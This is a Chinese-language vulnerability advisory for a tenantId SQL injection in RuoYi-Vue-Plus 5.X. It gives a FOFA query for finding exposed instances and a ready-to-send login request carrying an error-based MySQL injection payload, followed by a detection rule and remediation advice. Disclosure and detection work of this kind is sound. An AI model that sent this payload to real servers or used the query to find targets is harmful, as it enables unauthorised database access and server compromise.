# RuoYi-Vue-Plus-5.X tenant_id SQL注入漏洞(XVE-2026-50962)

RuoYi-Vue-Plus-5.X tenant_id SQL注入漏洞(XVE-2026-50962)，攻击者可执行任意sql命令导致服务器被控。

# 影响版本

RuoYi-Vue-Plus-5.X

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：body="RuoYi-Vue-Plus后台管理框架"

POC/EXP：

利用门槛：

1、目标启用多租户登录/注册

2、已知一个存在并启用的租户ID，默认为（000000）

```
POST /auth/login HTTP/1.1
Host: 127.0.0.1
Accept-Encoding: gzip
Connection: keep-alive
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36

{ 
  "clientId": "e5cd7e4891bf95d1d19206ce24a7b32e",
  "grantType": "password",
  "tenantId": "000000' AND extractvalue(1,concat(0x7e,(SELECT version()))) AND '1'='1",
  "username": "test",
  "password": "test123"
}
```

![image-20260821172432532](assets/image-20260821172432532.png)

sonrt规则：

```
alert http any any -> $HOME_NET any (
    msg:"RuoYi-Vue-Plus 5.X XVE-2026-50962 - /auth/login tenantId SQL注入 (extractvalue报错注入)";
    flow:to_server,established;
    http.method; content:"POST";
    http.uri;
        content:"/auth/login";
        fast_pattern;
    http.content_type; content:"application/json";
    http.request_body;
        content:"tenantId"; nocase;
        content:"extractvalue("; distance:0; nocase;
        content:"concat("; distance:0; nocase;
        content:"0x7e"; distance:0; nocase;
        content:"SELECT"; distance:0; nocase;
    metadata:
        service http,
        affected_product "RuoYi-Vue-Plus 5.x (<=5.6.x)",
        vulnerability_type "SQL Injection (MySQL Error-based)",
        xve "XVE-2026-50962",
        severity "critical";
    classtype:web-application-attack;
    sid:1000729;
    rev:1;
    priority:1;
)
```

# 漏洞修复

关闭互联网暴露面或接口设置访问权限，升级至安全版本。
